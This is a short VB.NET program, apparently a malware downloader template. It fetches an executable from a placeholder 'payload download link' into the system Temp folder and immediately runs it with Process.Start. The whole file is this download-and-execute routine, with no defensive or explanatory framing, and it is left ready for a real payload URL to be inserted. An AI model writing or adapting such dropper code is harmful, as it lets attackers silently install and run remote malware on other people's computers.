Imports System.Net
Module Module1

    Sub Main()

        Call dataMain()

    End Sub

    Sub dataMain()


        Using client As New WebClient()

        Dim remoteUri As String = "https://your payload download link"
            Dim mainPath As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim fileName As String = mainPath & "payload name.exe"

            client.DownloadFile(remoteUri, fileName)

            Call StartLink()

        End Using


    End Sub

    Sub StartLink()

        Dim path As String = My.Computer.FileSystem.SpecialDirectories.Temp

        Dim dsgsdd As New ProcessStartInfo

Dim linkStart As New ProcessStartInfo(path & "payload name.exe")

        Process.Start(linkStart)

    End Sub

End Module
